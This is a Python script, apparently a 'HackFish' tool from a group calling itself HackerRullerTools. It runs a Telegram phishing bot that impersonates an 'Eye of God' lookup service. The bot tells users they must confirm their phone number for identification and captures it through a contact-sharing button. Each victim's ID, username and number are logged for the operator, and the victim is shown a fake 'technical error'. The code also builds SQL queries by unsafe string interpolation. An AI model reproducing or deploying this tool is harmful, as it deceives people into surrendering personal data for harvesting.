
try:
    from colorama import init
    from colorama import Fore, Back, Style
except:
    os.system('pip install colorama')
    from colorama import init
    from colorama import Fore, Back, Style
print(Fore.GREEN)
print("<HackerRullerTools> –ó–∞–ø—É—Å–∫!")
import os
os.system("apt update && apt upgrade")

try:
    from platform import platform
except:
    os.system("pip install platform")
    from platform import platform



puk = platform()[0], platform()[1], platform()[2], platform()[3], platform()[4], platform()[5], platform()[6]


if puk == ('W', 'i', 'n', 'd', 'o', 'w', 's'):
    delet = 'cls'
    dr = '\\'
else:
    delet = 'clear'
    dr = '/'



os.system(delet)




import tracemalloc

from threading import Event

try:
    from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove
    from aiogram import Bot, Dispatcher, executor, types
    from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup
    from aiogram.contrib.fsm_storage.memory import MemoryStorage
except:
    os.system("pip install aiogram")
    from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove
    from aiogram import Bot, Dispatcher, executor, types
    from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup
    from aiogram.contrib.fsm_storage.memory import MemoryStorage

try:
    import asyncio
except:
    os.system("pip install asyncio")
    import asyncio

try:
    import requests
except:
    os.system("pip install requests")
    import requests
import time

try:
    from art import *
except:
    os.system("pip install art")
    from art import *

try:
    import sqlite3 as sq
except:
    os.system('pip install sqlite3')
    import sqlite3 as sq



def printtext(text):
    art1 = text2art(text)
    print(art1)
    



def printair(i):
    for l in range(i):
        time.sleep(0.6)
        print()


tracemalloc.start()


storage = MemoryStorage()



bot = None
token = None
dp = None
text1 = None
text2 = None
text3 = None


with sq.connect("configs_hack_fish.db") as con:
    sql = con.cursor()
    sql.execute("CREATE TABLE IF NOT EXISTS configs (config TEXT, text1 TEXT, text2 TEXT, text3 TEXT, token TEXT)")



menu = """1: –í—Ö–æ–¥ –ø–æ —Ç–æ–∫–µ–Ω—É!
2: –í—Ö–æ–¥ –ø–æ –∫–æ–Ω—Ñ–∏–≥—É!"""




def registerbot():
    title()
    print(menu)
    try:
        number_menu = int(input('–í–≤–µ–¥–∏—Ç–µ —á—Ç–æ —Ö–æ—Ç–∏—Ç–µ –≤—ã–±—Ä–∞—Ç—å: '))
        if number_menu == 1:
            token_register()
        if number_menu == 2:
            config_register()
    except ValueError:
        error('–í–≤–µ–¥–∏—Ç–µ —á–∏—Å–ª–æ!')



def error(text):
    print(Fore.RED)
    os.system(delet)
    printtext('Error')
    print(text)
    time.sleep(3)
    registerbot()
    print(Fore.GREEN)



def error2(text):
    print(Fore.RED)
    os.system(delet)
    printtext('Error')
    print(text)
    print(Fore.GREEN)



def title():
    os.system(delet)
    print(Fore.GREEN)
    printtext('HackFish')

def config_register():
    sql = con.cursor()
    sql.execute(f"SELECT * FROM configs")
    configs = str(sql.fetchone())
    if configs == 'None':
        error('–£ –≤–∞—Å –Ω–µ—Ç—É –∫–æ–Ω—Ñ–∏–≥–æ–≤!')
    else:
        while True:
            os.system(delet)
            title()
            print('–í–≤–µ–¥–∏—Ç–µ –Ω–∞–∑–≤–∞–Ω–∏–µ –∫–æ–Ω—Ñ–∏–≥–∞!')
            config2 = str(input('–ß—Ç–æ–±—ã –æ—Ç–º–µ–Ω–∏—Ç—å –Ω–∞–ø–∏—à–∏—Ç–µ (back): '))
            if config2 == 'back':
                registerbot()
                break
            con.cursor()
            sql.execute(f"SELECT * FROM configs WHERE config = '{config2}'")
            if sql.fetchone() is None:
                error2('–≠—Ç–æ–≥–æ –∫–æ–Ω—Ñ–∏–≥–∞ –Ω–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç!')
                time.sleep(3)
                title()
            else:
                global bot
                global token
                global dp
                global text1
                global text2
                global text3
                sql.execute(f"SELECT * FROM configs WHERE config = '{config2}'")
                token = sql.fetchone()[4]
                sql.execute(f"SELECT * FROM configs WHERE config = '{config2}'")
                text1 = sql.fetchone()[1]
                sql.execute(f"SELECT * FROM configs WHERE config = '{config2}'")
                text2 = sql.fetchone()[2]
                sql.execute(f"SELECT * FROM configs WHERE config = '{config2}'")
                text3 = sql.fetchone()[3]
                os.system(delet)
                title()
                while True:
                    print(f'–ï—Å–ª–∏ –≤—ã —Ö–æ—Ç–∏—Ç–µ –¥—Ä—É–≥–æ–π —Ç–æ–∫–µ–Ω –Ω–∞–ø–∏—à–∏—Ç–µ –µ–≥–æ! –¢–æ–∫–µ–Ω –∫–æ–Ω—Ñ–∏–≥–∞: {token}')
                    token2 = input('–ü—Ä–æ–ø—É—Å—Ç–∏—Ç–µ –µ—Å–ª–∏ –Ω–µ —Ö–æ—Ç–∏—Ç–µ –µ–≥–æ –º–µ–Ω—è—Ç—å: ')
                    if token2 != '':
                        try:
                            bot = Bot(token2)
                            dp = Dispatcher(bot, storage=storage)
                            os.system(delet)
                            title()
                            break
                        except:
                            error2('–í–≤–µ–¥–∏—Ç–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π —Ç–æ–∫–µ–Ω!')
                            time.sleep(3)
                            title()
                    else:
                        bot = Bot(token)
                        dp = Dispatcher(bot, storage=storage)
                        os.system(delet)
                        title()
                        break
                break



def token_register():
    global bot
    global token
    global dp
    global text1
    global text2
    global text3
    os.system(delet)
    while True:
        title()
        token = str(input('–í–≤–µ–¥–∏—Ç–µ —Ç–æ–∫–µ–Ω (—á—Ç–æ–±—ã –≤–µ—Ä–Ω—É—Ç—Å—è –æ–±—Ä–∞—Ç–Ω–æ –Ω–∞–ø–∏—à–∏—Ç–µ: back): '))
        if token == 'back':
            registerbot()
        else:
            try:
                bot = Bot(token)
                dp = Dispatcher(bot, storage=storage)
                os.system(delet)
                title()
                print('–í–≤–µ–¥–∏—Ç–µ —Å–æ–æ–±—â–µ–Ω–∏–µ –∫–æ—Ç–æ—Ä–æ–µ –ø–∏—à–µ—Ç –±–æ—Ç –ø—Ä–∏ –∫–æ–º–∞–Ω–¥–µ: /start!')
                text1 = str(input('–ü—Ä–æ–ø—É—Å—Ç–∏—Ç–µ —á—Ç–æ–±—ã –±–æ—Ç –ø—Ä–µ–¥—Å—Ç–∞–≤–ª—è–ª—Å—è –≥–ª–∞–∑–æ–º –±–æ–≥–∞: '))
                os.system(delet)
                title()
                print('–í–≤–µ–¥–∏—Ç–µ —Å–æ–æ–±—â–µ–Ω–∏–µ –∫–Ω–æ–ø–∫–∏ —Å–Ω–∏–∑—É!')
                text2 = str(input('–ü—Ä–æ–ø—É—Å—Ç–∏—Ç–µ —á—Ç–æ–±—ã –∫–Ω–æ–ø–∫–∞ –±—ã–ª–∞ –∫–∞–∫ —É –≥–ª–∞–∑–∞ –±–æ–≥–∞: '))
                os.system(delet)
                title()
                print('–í–≤–µ–¥–∏—Ç–µ —Å–æ–æ–±—â–µ–Ω–∏–µ –∫–æ—Ç–æ—Ä–æ–µ –±–æ—Ç –æ—Ç–ø—Ä–∞–≤–∏—Ç –ø–æ—Å–ª–µ –ø–æ–ª—É—á–µ–Ω–∏—è –Ω–æ–º–µ—Ä–∞!')
                text3 = str(input('–ü—Ä–æ–ø—É—Å—Ç–∏—Ç–µ —á—Ç–æ–±—ã –±—ã–ª–∞ —Ç–µ—Ö–Ω–∏—á–µ—Å–∫–∞—è –æ—à–∏–±–∫–∞: '))
                os.system(delet)
                title()
                if text1 == '':
                    text1 = """üóÇ –ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞

–í–∞–º –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –ø–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ –¥–ª—è —Ç–æ–≥–æ, —á—Ç–æ–±—ã –∑–∞–≤–µ—Ä—à–∏—Ç—å –∏–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—é.

–î–ª—è —ç—Ç–æ–≥–æ –Ω–∞–∂–º–∏—Ç–µ –∫–Ω–æ–ø–∫—É –Ω–∏–∂–µ."""
                if text2 == '':
                    text2 = '‚úÖ –ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞'
                if text3 == '':
                    text3 = '‚ùå –¢–µ—Ö–Ω–∏—á–µ—Å–∫–∞—è –æ—à–∏–±–∫–∞! –ü—Ä–æ—Å–∏–º –∏–∑–≤–∏–Ω–µ–Ω–∏—è!'
                while True:
                    print('–°–æ–∑–¥–∞–π—Ç–µ –∫–æ–Ω—Ñ–∏–≥, –Ω–∞–ø–∏—à–∏—Ç–µ –Ω–∞–∑–≤–∞–Ω–∏–µ!')
                    config2 = str(input('–ü—Ä–æ–ø—É—Å—Ç–∏—Ç–µ –µ—Å–ª–∏ –Ω–µ —Ö–æ—Ç–∏—Ç–µ —Å–æ–∑–¥–∞–≤–∞—Ç—å –∫–æ–Ω—Ñ–∏–≥: '))
                    config2 = config2.lower()
                    if config2 == 'back':
                        error2('–ù–µ–∫–∫–æ—Ä–µ–∫—Ç–Ω–æ–µ –Ω–∞–∑–≤–∞–Ω–∏–µ –∫–æ–Ω—Ñ–∏–≥–∞!')
                        time.sleep(3)
                        os.system(delet)
                        title()
                    if config2 != '':
                        sql = con.cursor()
                        sql.execute(f"SELECT * FROM configs WHERE config = '{config2}'")
                        if sql.fetchone() is None:
                            sql.execute(f"INSERT INTO configs (config, text1, text2, text3, token) VALUES('{config2}', '{text1}', '{text2}', '{text3}', '{token}')")
                            con.commit()
                            break
                        else:
                            error2('–¢–∞–∫–æ–π –∫–æ–Ω—Ñ–∏–≥ —É–∂–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç!')
                            time.sleep(3)
                            os.system(delet)
                            title()
                    else:
                        os.system(delet)
                        title()
                        break
        

                break
            except:
                error2('–í–≤–µ–¥–∏—Ç–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π —Ç–æ–∫–µ–Ω!')
                time.sleep(3)
                title()
    

registerbot()

follower = types.InlineKeyboardMarkup(row_width=2)
followerbutton1 = types.InlineKeyboardButton(text='–ù–∞—à –ö–∞–Ω–∞–ª üñ§', url='t.me/HackeeRullerToolsOfficial')
followerbutton2 = types.InlineKeyboardButton(text='–ù–∞—à —á–∞—Ç üí§', url='https://t.me/HackerRullerTools')
follower.add(followerbutton1).add(followerbutton2)




contct = ReplyKeyboardMarkup(resize_keyboard=True)
contct.add(
    KeyboardButton(
        text=text2,
        request_contact=True
    )
)




@dp.message_handler(commands='start')
async def cmd_start(message: types.Message):
    await message.answer(text1, reply_markup=contct)




@dp.message_handler(content_types=['contact'])
async def clicker_test(message: types.Message):
    mt = message.text
    id = message.from_user.id
    us = message.from_user.username
    con = message.contact.phone_number
    print(Fore.YELLOW)
    print(f'Bot > –û—Ç –∞–π–¥–∏: {id} - –ø—Å–µ–≤–¥–æ–Ω–∏–º–∞: @{us}: —Å–æ–æ–±—â–µ–Ω–∏–µ: {mt} - –Ω–æ–º–µ—Ä: {con}')
    print(Fore.GREEN)
    await message.answer(text3, reply_markup=follower)






async def end(_):
    print(Fore.YELLOW)
    print('-----------------------------------------------------------------------------')
    print(Fore.GREEN)
    printtext('BotActive')
    print('\n–ù–∞—à –ö–∞–Ω–∞–ª t.me/HackeeRullerToolsOfficial\n–ù–∞—à —á–∞—Ç https://t.me/HackerRullerTools\n\n–õ–æ–≥–∏ - —Å—É–¥–∞ –±—É–¥—É—Ç –ø—Ä–∏—Ö–æ–¥–∏—Ç—å –Ω–æ–º–µ—Ä–∞!\n')
    print(Fore.YELLOW)
    print('-----------------------------------------------------------------------------')
    print(Fore.GREEN)




if __name__ == '__main__':
    executor.start_polling(dp, on_startup=end)
